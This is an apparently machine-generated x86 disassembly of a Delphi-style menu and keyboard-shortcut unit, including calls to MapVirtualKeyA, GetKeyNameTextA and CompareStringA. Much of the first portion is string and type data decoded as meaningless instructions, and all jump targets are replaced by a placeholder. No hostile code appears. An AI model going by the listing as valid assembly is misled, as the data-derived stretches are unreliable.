lea eax [ eax ]
mov al 0x23
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and ebp [ edx - 0x55dbdbfd ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
and ebp [ edx - 0x55dbe7fd ]
add ebx [ eax ]
add [ eax ] al
sbb al 0x8b
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx - 0x7bf3fc59 ] 0x1
stosb [ edi ]
add ebp [ eax - 0x23fc557c ]
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
and [ ecx - 0x56 ] bh
add esi esp
sub [ edx - 0x5575b3fd ] 0x3
mov [ ecx + 0x540903aa ] cs
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
sar al 0x24
stosb [ edi ]
add eax [ edi ]
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xac756e65
and al 0xaa
add esp [ eax ]
and al 0xaa
add ecx [ ebx ]
add [ 0x756e654d ] al
jae r-xdata
add esi [ ecx + ecx * 4 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x1e ] al
stosb [ edi ]
add esp [ ecx + ecx * 4 ]
stosb [ edi ]
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
call 0x3f2295f
dec eax
outsd
je r-xdata
adc [ esi + 0x4003 ] ah
[ ebx + eax * 4 ]
jns r-xdata
add bh bh
insb
test [ edx + 0x103 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
sbb al 0xe8
stosd [ edi ]
add ecx [ eax ]
inc eax
push ds
stosb [ edi ]
add ecx [ eax - 0x77 ]
stosb [ edi ]
add ebx [ eax - 0x77 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ eax + eax ]
[ ecx + ecx * 4 - 0x56 ]
sub_3aa2572
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
add bh bh
ror [ eax + 0x103aa ] 0x0
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
pop esp
je r-xdata
shl [ esi ] 0xaa
add ecx [ 0x654c616d ]
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x26 ] al
stosb [ edi ]
add eax [ esi ]
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4c65646f
sbb al 0xaa
add edx [ eax ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
inc esp
stosb [ edi ]
add eax [ ebx ]
andps xmm2 [ eax + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ esi + 0x4103 ] ah
inc eax
mov [ edx + 0x103 ] ch
outsd
je r-xdata
add esi [ eax ]
add [ eax ] al
[ eax + ecx * 4 - 0x7ec7fc56 ]
stosb [ edi ]
add ecx [ ebp + 0x27900040 ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
outsd
test [ esi ] ah
stosb [ edi ]
add eax [ ebx ]
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
les esp [ esi ]
stosb [ edi ]
jo r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
call 0x3f2295f
jns r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
cmp eax 0x45d403a8
add esp [ esp + eax * 4 ]
stosb [ edi ]
add ebx eax
nop
stosb [ edi ]
add edx [ ecx + edx * 4 + 0x540a03aa ]
push eax
outsd
jo r-xdata
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
adc [ esi + 0x4003 ] ah
[ ebx + eax * 4 ]
add bh bh
insb
test [ edx + 0x103 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
sbb al 0xe8
stosd [ edi ]
add ecx [ eax ]
inc eax
push ds
stosb [ edi ]
add ecx [ eax - 0x77 ]
stosb [ edi ]
add ebx [ eax - 0x77 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
add ecx [ eax - 0x77 ]
stosb [ edi ]
add ebx [ eax - 0x77 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ eax + edx * 4 - 0x544bfc56 ]
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx [ esp + eax * 4 ]
stosb [ edi ]
add ebp [ eax - 0x23fc557c ]
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
xor [ eax - 0x7c0bfc56 ] dl
stosb [ edi ]
add esp [ eax ]
jpe r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
daa
stosb [ edi ]
add edi [ eax ]
add [ eax ] al
and ebp [ fs : edx - 0x57c20ffd ]
add edx esp
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
insd
popad
jae r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ eax + eax ]
[ ecx + ecx * 4 - 0x56 ]
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add esp [ ecx ]
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add esp [ ecx + ecx * 4 ]
stosb [ edi ]
add esi [ ecx + ecx * 4 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add edx eax
cmpsb [ esi ] [ edi ]
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xd03aa26 ] al
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x74754274
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
dec eax
in al 0x27
stosb [ edi ]
add eax [ edi ]
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
outsd
sub al 0x27
stosb [ edi ]
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add bh bh
sub al 0x83
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
je r-xdata
jo r-xdata
add ebp esp
nop
stosb [ edi ]
add esi esp
nop
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
add eax 0x75411100
add [ eax ] al
jo r-xdata
or al 0x54
push esp
jb r-xdata
add eax [ ebx ]
andps xmm1 [ ebp + 0x65 ]
outsb
stosb [ edi ]
inc ebp
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add eax eax
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
inc eax
mov [ edx + 0x103 ] ch
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
sbb al 0xe8
stosd [ edi ]
add ecx [ eax ]
add bh bh
insb
test [ edx + 0x103 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmpsd [ esi ] [ edi ]
add ecx eax
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ eax ] al
je r-xdata
jne r-xdata
nop
inc eax
push ds
stosb [ edi ]
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
daa
stosb [ edi ]
add eax [ eax ]
je r-xdata
outsd
dec esp
add eax [ esi ]
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
sub ch [ edx + 0x803 ]
add [ eax - 0x37fc57b6 ] ch
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
jo r-xdata
inc ebx
push 0x65676e61
cld
jne r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8065646f
stosb [ edi ]
add ebp [ eax ]
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ esi + 0x4003 ] ah
[ ebx + eax * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
daa
stosb [ edi ]
add ebp [ ecx ]
add bh bh
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
add [ eax - 0x37fc5885 ] al
outsb
dec esp
sbb al 0xaa
add edx [ eax ]
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
add esi [ eax ]
add bh bh
jo r-xdata
adc [ esi + 0x4103 ] ah
outsd
je r-xdata
add esi [ eax ]
add [ eax ] al
[ eax + ecx * 4 - 0x7ec7fc56 ]
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
daa
stosb [ edi ]
add esp [ eax ]
and al 0xaa
add edx [ eax ]
add [ 0x756e654d ] al
jae r-xdata
outsb
add eax 0x756e654d
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebx ]
cmpsd [ esi ] [ edi ]
add edi [ esp - 0x58c3fc59 ]
cmpsd [ esi ] [ edi ]
add esi [ eax - 0x5d ]
cmpsd [ esi ] [ edi ]
add ebp eax
mov [ 0xffffffff8aa803a7 ] eax
stosb [ edi ]
add ecx [ edx ]
push esp
push eax
outsd
jo r-xdata
shl [ edx + ebp ] 0xaa
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] cl
stosb [ edi ]
add edx [ eax + eax ]
add [ eax ] al
cmp [ ebx - 0x59 ] 0x3
enter 0xa645 0x3
aam 0x45
test al 0x3
dec eax
dec esi
test al 0x3
sub [ esi - 0x58 ] cl
add edx [ esi + ecx * 2 ]
test al 0x3
push cs
push esp
dec ebp
outsb
jne r-xdata
in al 0x4d
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp esp
dec ebp
imul esi [ ebx + 0x74 ] 0xaa2aa090
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x803aa ] ch
add [ eax ] al
test al 0x4a
test al 0x3
enter 0xa645 0x3
aam 0x45
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
inc eax
push ds
stosb [ edi ]
add [ eax + 0x26 ] al
stosb [ edi ]
add esp [ eax ]
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov eax esi
pop edi
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_3ab4a48
mov esi eax
test esi esi
jne r-xdata
pop esi
pop ebx
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_3aa2aec
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_3aae0c4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_3ab4a48
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_3aa2b48
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
movzx eax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_3aa2b80
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_3a652a0
push 0x0
movzx eax [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_3a65510
sub_3aa2bd4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_3aa2db3
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ebx [ ebp - 0x2 ]
movzx eax bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_3a65338
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x41
add edx 0x41
call sub_3a65488
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_3a65338
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_3a65338
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x60
add edx 0x30
call sub_3a65488
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x30
add edx 0x30
call sub_3a65488
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_3a652a0
mov eax esi
call sub_3a652a0
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_3a65338
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
movzx eax bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_3a6986c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a655b8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x2 ]
call sub_3aa2b80
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_3a6556c
lea eax [ ebp - 0x8 ]
add bl 0x4
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_3a65338
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_3a6556c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_3a6556c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_3a6556c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa2dba
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_3a652c4
retn
sub_3aa2dcc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
mov edx ebx
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
cmp edx eax
jg r-xdata
sub edx 0x4
mov edx [ edx ]
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
test esi esi
je r-xdata
mov eax ebx
call sub_3a65730
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a65730
mov ecx esi
pop edx
call sub_3a69568
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov [ ebp - 0x5 ] 0x1
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_3a657d8
sub eax 0x4
mov eax [ eax ]
sub_3aa2e54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3aa2f77
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3aa2dcc
test al al
je r-xdata
or [ ebp - 0x8 ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_3aa2dcc
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_3aa2dcc
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_3aa2dcc
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0x8 ] 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa2f7e
lea eax [ ebp - 0x10 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov di 0x8
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0xc ]
call sub_3a65730
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
inc edi
cmp di 0x256
jne r-xdata
or di [ ebp - 0x8 ]
mov [ ebp - 0x6 ] di
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_3aa2bd4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub_3aa2fb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_3aa6694
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_3aa66a4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_3aa301c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_3aa6694
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_3aa6694
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_3aa66a4
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_3aa66a4
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_3aa2fb8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_3aa2fb8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_3aa66a4
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_3aa66a4
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_3aa316c
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_3aa94e0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_3aa31a4
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa31d4
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa3204
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a98
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa3234
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0ac0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_3a656c8
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aa3268
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_3ac0a84
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
